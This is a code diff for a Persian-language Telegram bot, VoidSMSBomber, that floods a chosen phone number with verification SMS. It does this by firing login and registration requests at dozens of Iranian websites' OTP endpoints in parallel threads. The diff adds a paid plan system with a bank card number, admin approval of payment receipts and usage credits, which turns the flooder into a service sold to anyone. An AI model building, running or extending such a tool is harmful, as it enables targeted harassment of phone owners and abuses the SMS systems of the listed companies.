@@ -4,46 +4,77 @@ import time
 import requests
 import phonenumbers
 import os
+import json
 import telebot
+from telebot import types
+from flask import Flask
 
-# توکن از تنظیمات رندر (Environment Variables) خونده میشه
+# ==========================================
+# وب‌سرور کوچک برای جلوگیری از خطای پورت در Render
+# ==========================================
+app = Flask(__name__)
+
+@app.route('/')
+def health():
+    return "Bot is running!", 200
+
+def run_web():
+    port = int(os.environ.get("PORT", 8080))
+    # استفاده از use_reloader=False برای جلوگیری از خطا در محیط سرور
+    app.run(host='0.0.0.0', port=port, use_reloader=False)
+
+# اجرای وب‌سرور در پس‌زمینه
+threading.Thread(target=run_web, daemon=True).start()
+
+# ==========================================
+# تنظیمات اولیه ربات
+# ==========================================
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
+ADMIN_ID = 6914309071
+CARD_NUMBER = "6219861451091986"
+DB_FILE = "users_db.json"
 
 bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
-bot_state = {"running": False, "phone": "", "success": 0, "fail": 0}
-current_bot_bomber = None
 
+def load_db():
+    if os.path.exists(DB_FILE):
+        with open(DB_FILE, "r") as f:
+            return json.load(f)
+    return {}
+
+def save_db(db):
+    with open(DB_FILE, "w") as f:
+        json.dump(db, f)
+
+user_states = {} 
+pending_approvals = {} 
+
+PLANS = {
+    "basic": {"name": "پلن پایه (Basic)", "price": 150, "uses": 10, "description": "مناسب برای تست\n⚡ سرعت: معمولی\n📱 ارسال به ۱۰ شماره"},
+    "pro": {"name": "پلن حرفه‌ای (Pro)", "price": 450, "uses": 50, "description": "مناسب روزانه\n🚀 سرعت: بالا\n📱 ارسال به ۵۰ شماره"},
+    "vip": {"name": "پلن ویژه (VIP)", "price": 600, "uses": 9999, "description": "قدرت نامحدود\n🔥 سرعت: اولترا\n📱 ارسال نامحدود"}
+}
+
+# ==========================================
+# بخش بمبر
+# ==========================================
 class Bomber:
-    def __init__(self, phone_number, log_callback=None, progress_callback=None):
+    def __init__(self, phone_number, log_callback=None):
         self.phone_number = phone_number
         self.log_callback = log_callback
-        self.progress_callback = progress_callback
         self.services = []
         self.load_services()
-        
         self.session = requests.Session()
-        adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
-        self.session.mount('http://', adapter)
-        self.session.mount('https://', adapter)
-        
         self.stop_event = threading.Event()
         self.success_count = 0
         self.fail_count = 0
-        self.total_requests = 0
-        self.completed_requests = 0
-        self.rate_limited_services = []
 
     def log(self, message):
         if self.log_callback:
             self.log_callback(message)
 
-    def update_progress(self):
-        if self.progress_callback:
-            self.progress_callback(self.completed_requests, self.total_requests)
-
     def load_services(self):
-        suffix = self.phone_number.split("+98")[1] if "+98" in self.phone_number else self.phone_number.lstrip("0")
-        
+        # ⚠️⚠️⚠️ لیست کامل سرویس‌های خودت رو اینجا کپی کن ⚠️⚠️⚠️
         self.services = [
             {'name': 'Digikala Jet', 'url': 'https://api.digikalajet.ir/user/login-register/', 'method': 'POST', 'data': lambda: {"phone": self.phone_number}, 'json': True},
             {'name': 'Jabama', 'url': 'https://taraazws.jabama.com/api/v4/account/send-code', 'method': 'POST', 'data': lambda: {"mobile": self.phone_number}, 'json': True},
@@ -137,28 +168,15 @@ class Bomber:
             {'name': 'Myroz', 'url': 'https://myroz.ir/wp-admin/admin-ajax.php', 'method': 'POST', 'data': lambda: {"action": "stm_login_register", "type": "mobile", "input": "0" + self.phone_number.split("+98")[1]}, 'json': False},
             {'name': 'Sunnybook', 'url': 'https://sunnybook.ir/Home/RegisterUser', 'method': 'POST', 'data': lambda: {"name": "Mr", "password": "123456", "mobile": self.phone_number.split("+98")[1]}, 'json': True},
             {'name': 'Adinehbook', 'url': 'https://www.adinehbook.com/gp/flex/sign-in.html', 'method': 'POST', 'data': lambda: {"action": "sign", "phone_cell_or_email": "0" + self.phone_number.split("+98")[1]}, 'json': False},
-            {'name': 'Komodaa', 'url': 'https://api.komodaa.com/api/v2.6/loginRC/request', 'method': 'POST', 'data': lambda: {"phone_number": "0" + self.phone_number.split("+98")[1]}, 'json': True},
+            {'name': 'Komodaa', 'url': 'https://api.komodaa.com/api/v2.6/loginRC/request', 'method': 'POST', 'data': lambda: {"phone_number": "0" + self.phone_number.split("+98")[1]}, 'json': True},# بقیه سرویس‌ها...
         ]
-
-    def validate_phone(self):
-        try:
-            parsed = phonenumbers.parse(self.phone_number, None)
-            return phonenumbers.is_valid_number(parsed)
-        except:
-            return False
 
     def send_request(self, service):
         if self.stop_event.is_set():
             return
-            
-        if "+98" not in self.phone_number and "ir" not in service['url'].lower():
-            self.completed_requests += 1
-            self.update_progress()
-            return
-
         try:
             data = service['data']()
-            headers = {'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
+            headers = {'User-Agent': "Mozilla/5.0"}
             method = service['method'].upper()
             use_json = service.get('json', False)
 
@@ -172,138 +190,170 @@ class Bomber:
 
             if resp.status_code in (200, 201, 202, 204):
                 self.success_count += 1
-                self.log(f"✅ {service['name']}: Success")
-            elif resp.status_code in (400, 401, 403, 429):
-                self.fail_count += 1
-                self.log(f"⚠️ {service['name']}: Rate limited")
             else:
                 self.fail_count += 1
-                self.log(f"❓ {service['name']}: Status {resp.status_code}")
-        except Exception:
+        except:
             self.fail_count += 1
-            self.log(f"❌ {service['name']}: Timeout")
-        finally:
-            self.completed_requests += 1
-            self.update_progress()
 
-    def worker(self, services_subset):
-        for service in services_subset:
+    def start(self):
+        threads = []
+        chunk_size = max(1, len(self.services) // 15)
+        chunks = [self.services[i:i + chunk_size] for i in range(0, len(self.services), chunk_size)]
+        
+        for chunk in chunks:
+            t = threading.Thread(target=self.worker, args=(chunk,))
+            t.start()
+            threads.append(t)
+            
+        for t in threads:
+            t.join()
+        self.log(f"✅ پایان! موفق: {self.success_count} | ناموفق: {self.fail_count}")
+
+    def worker(self, subset):
+        for service in subset:
             if self.stop_event.is_set():
                 break
             self.send_request(service)
-            time.sleep(random.uniform(0.1, 0.5))
+            time.sleep(0.2)
 
-    def run_cycles(self, threads, cycles, delay):
-        service_count = len(self.services)
-        threads = min(threads, 30)
-        chunk_size = max(1, service_count // threads)
-        service_chunks = [self.services[i:i + chunk_size] for i in range(0, service_count, chunk_size)]
-
-        for cycle in range(1, cycles + 1):
-            if self.stop_event.is_set():
-                break
-            thread_list = []
-            for chunk in service_chunks:
-                if self.stop_event.is_set():
-                    break
-                t = threading.Thread(target=self.worker, args=(chunk,))
-                t.daemon = True
-                t.start()
-                thread_list.append(t)
-
-            for t in thread_list:
-                t.join(timeout=2)
-            time.sleep(delay)
-
-    def start(self, threads=10, cycles=2, delay=2):
-        if not self.validate_phone():
-            self.log("❌ Invalid phone number!")
-            return
-
-        self.success_count = 0
-        self.fail_count = 0
-        self.completed_requests = 0
-        self.total_requests = len(self.services) * cycles
-        self.stop_event.clear()
-
-        self.log(f"🚀 Starting on {self.phone_number}")
-        self.run_cycles(threads, cycles, delay)
-        self.log(f"✅ Done! Success: {self.success_count} | Failed: {self.fail_count}")
-
-    def stop(self):
-        self.stop_event.set()
-
+# ==========================================
+# بخش ربات تلگرام و دکمه‌ها
+# ==========================================
 @bot.message_handler(commands=['start', 'help'])
 def send_welcome(message):
-    text = "ربات آماده است!\n/bomb [شماره] : شروع ارسال\n/status : وضعیت\n/stop : توقف"
-    bot.reply_to(message, text)
+    markup = types.InlineKeyboardMarkup(row_width=1)
+    markup.add(
+        types.InlineKeyboardButton("🚀 اجرای بمبر", callback_data="run_bomber"),
+        types.InlineKeyboardButton("🛒 خرید / ارتقای پلن", callback_data="buy_plan"),
+        types.InlineKeyboardButton("📋 پلن من", callback_data="my_plan")
+    )
+    bot.reply_to(message, "سلام! 👋\nبه ربات **VoidSMSBomber** خوش آمدید.", reply_markup=markup, parse_mode='Markdown')
+
+@bot.callback_query_handler(func=lambda call: True)
+def handle_callback(call):
+    user_id = str(call.from_user.id)
+    
+    if call.data == "run_bomber":
+        bot.answer_callback_query(call.id)
+        db = load_db()
+        if user_id not in db or db[user_id].get("remaining_uses", 0) <= 0:
+            bot.send_message(call.message.chat.id, "❌ اعتبار کافی ندارید! ابتدا پلن بخرید.")
+            return
+        bot.send_message(call.message.chat.id, "📞 لطفاً شماره را وارد کنید: `/bomb 09123456789`", parse_mode='Markdown')
+
+    elif call.data == "buy_plan":
+        text = "🛒 **لیست پلن‌ها:**\n\n"
+        markup = types.InlineKeyboardMarkup(row_width=1)
+        for key, plan in PLANS.items():
+            text += f"🔹 **{plan['name']}** | {plan['price']} تومان | {plan['uses']} استفاده\n{plan['description']}\n\n"
+            markup.add(types.InlineKeyboardButton(f"خرید {plan['name']}", callback_data=f"select_plan_{key}"))
+        markup.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="back_to_menu"))
+        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
+
+    elif call.data.startswith("select_plan_"):
+        plan_key = call.data.replace("select_plan_", "")
+        user_states[user_id] = {"selected_plan": plan_key}
+        plan = PLANS[plan_key]
+        text = f"✅ شما **{plan['name']}** را انتخاب کردید.\n\n💳 مبلغ **{plan['price']} تومان** را به کارت زیر واریز کنید:\n`{CARD_NUMBER}`\n\n📸 سپس **عکس رسید** را بفرستید."
+        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
+
+    elif call.data == "my_plan":
+        bot.answer_callback_query(call.id)
+        db = load_db()
+        if user_id in db:
+            plan_name = PLANS[db[user_id]['plan']]['name']
+            bot.send_message(call.message.chat.id, f"📋 **وضعیت:**\nپلن: **{plan_name}**\nاستفاده باقی مانده: **{db[user_id]['remaining_uses']}** بار", parse_mode='Markdown')
+        else:
+            bot.send_message(call.message.chat.id, "📋 شما پلن فعالی ندارید.")
+
+    elif call.data == "back_to_menu":
+        bot.answer_callback_query(call.id)
+        markup = types.InlineKeyboardMarkup(row_width=1)
+        markup.add(
+            types.InlineKeyboardButton("🚀 اجرای بمبر", callback_data="run_bomber"),
+            types.InlineKeyboardButton("🛒 خرید / ارتقای پلن", callback_data="buy_plan"),
+            types.InlineKeyboardButton("📋 پلن من", callback_data="my_plan")
+        )
+        bot.edit_message_text("منوی اصلی:", call.message.chat.id, call.message.message_id, reply_markup=markup)
+
+    elif call.data.startswith("admin_approve_"):
+        req_id = call.data.replace("admin_approve_", "")
+        if req_id in pending_approvals:
+            data = pending_approvals[req_id]
+            uid = data["user_id"]
+            plan_key = data["plan"]
+            plan = PLANS[plan_key]
+            
+            db = load_db()
+            if uid not in db:
+                db[uid] = {"plan": plan_key, "remaining_uses": 0}
+            else:
+                db[uid]["plan"] = plan_key
+                db[uid]["remaining_uses"] += plan["uses"]
+            save_db(db)
+            
+            bot.edit_message_text(f"✅ تایید شد. پلن {plan['name']} برای کاربر {uid} فعال شد.", call.message.chat.id, call.message.message_id)
+            bot.send_message(uid, f"🎉 **تبریک!**\nپلن **{plan['name']}** با **{plan['uses']}** بار استفاده فعال شد.", parse_mode='Markdown')
+            del pending_approvals[req_id]
+
+    elif call.data.startswith("admin_reject_"):
+        req_id = call.data.replace("admin_reject_", "")
+        if req_id in pending_approvals:
+            uid = pending_approvals[req_id]["user_id"]
+            bot.edit_message_text(f"❌ رد شد.", call.message.chat.id, call.message.message_id)
+            bot.send_message(uid, "❌ رسید شما رد شد.")
+            del pending_approvals[req_id]
+
+@bot.message_handler(content_types=['photo'])
+def handle_receipt_photo(message):
+    user_id = str(message.from_user.id)
+    if user_id not in user_states or "selected_plan" not in user_states[user_id]:
+        bot.reply_to(message, "⚠️ ابتدا از منوی 'خرید پلن' یک پلن انتخاب کنید.")
+        return
+        
+    plan_key = user_states[user_id]["selected_plan"]
+    plan = PLANS[plan_key]
+    req_id = f"{user_id}_{int(time.time())}"
+    pending_approvals[req_id] = {"user_id": user_id, "plan": plan_key}
+    
+    bot.reply_to(message, "✅ رسید دریافت شد. منتظر تایید ادمین باشید.")
+    
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        types.InlineKeyboardButton("✅ تایید", callback_data=f"admin_approve_{req_id}"),
+        types.InlineKeyboardButton("❌ رد", callback_data=f"admin_reject_{req_id}")
+    )
+    
+    bot.send_message(ADMIN_ID, f"📩 **رسید جدید:**\nکاربر: `{user_id}`\nپلن: **{plan['name']}**", reply_markup=markup, parse_mode='Markdown')
+    bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
+    del user_states[user_id]
 
 @bot.message_handler(commands=['bomb'])
 def handle_bomb(message):
-    global current_bot_bomber, bot_state
-    if bot_state["running"]:
-        bot.reply_to(message, "⚠️ یک عملیات در حال اجراست.")
+    user_id = str(message.from_user.id)
+    db = load_db()
+    
+    if user_id not in db or db[user_id].get("remaining_uses", 0) <= 0:
+        bot.reply_to(message, "❌ اعتبار کافی ندارید! ابتدا پلن بخرید.")
         return
-
+        
     try:
         phone = message.text.split()[1]
     except IndexError:
-        bot.reply_to(message, "❌ لطفاً شماره را وارد کنید. مثال: /bomb 09123456789")
+        bot.reply_to(message, "❌ شماره را وارد کنید. مثال: /bomb 09123456789")
         return
 
     if not phone.startswith("+"):
         phone = "+98" + phone.lstrip("0")
-
-    bot_state["running"] = True
-    bot_state["phone"] = phone
-    bot_state["success"] = 0
-    bot_state["fail"] = 0
+        
+    db[user_id]["remaining_uses"] -= 1
+    save_db(db)
     
-    bot.reply_to(message, f"🚀 شروع عملیات برای {phone}")
-
-    def bot_log(msg):
-        if "Done" in msg or "Error" in msg or "Starting" in msg:
-            bot.send_message(message.chat.id, msg)
-
-    def bot_progress(completed, total):
-        bot_state["success"] = current_bot_bomber.success_count
-        bot_state["fail"] = current_bot_bomber.fail_count
-
-    current_bot_bomber = Bomber(phone, bot_log, bot_progress)
-
-    def run_bot_bomb():
-        global bot_state
-        try:
-            current_bot_bomber.start(threads=15, cycles=2)
-        except Exception as e:
-            bot.send_message(message.chat.id, f"❌ Error: {e}")
-        finally:
-            bot_state["running"] = False
-            bot.send_message(
-                message.chat.id, 
-                f"✅ عملیات تمام شد!\nموفق: {current_bot_bomber.success_count}\nناموفق: {current_bot_bomber.fail_count}"
-            )
-
-    threading.Thread(target=run_bot_bomb, daemon=True).start()
-
-@bot.message_handler(commands=['status'])
-def handle_status(message):
-    if bot_state["running"]:
-        text = f"📊 وضعیت:\nشماره: {bot_state['phone']}\nموفق: {bot_state['success']}\nناموفق: {bot_state['fail']}"
-    else:
-        text = "💤 در حال حاضر هیچ عملیاتی در حال اجرا نیست."
-    bot.reply_to(message, text)
-
-@bot.message_handler(commands=['stop'])
-def handle_stop(message):
-    global current_bot_bomber, bot_state
-    if bot_state["running"] and current_bot_bomber:
-        current_bot_bomber.stop()
-        bot_state["running"] = False
-        bot.reply_to(message, "⏹️ عملیات متوقف شد.")
-    else:
-        bot.reply_to(message, "⚠️ هیچ عملیاتی در حال اجرا نیست.")
+    bot.reply_to(message, f"🚀 شروع عملیات برای {phone}...")
+    
+    bomber = Bomber(phone, lambda m: bot.send_message(message.chat.id, m))
+    threading.Thread(target=bomber.start).start()
 
 if __name__ == "__main__":
-    print("🤖 ربات روشن شد...")
+    print("🤖 ربات و وب‌سرور روشن شدند...")
     bot.infinity_polling()
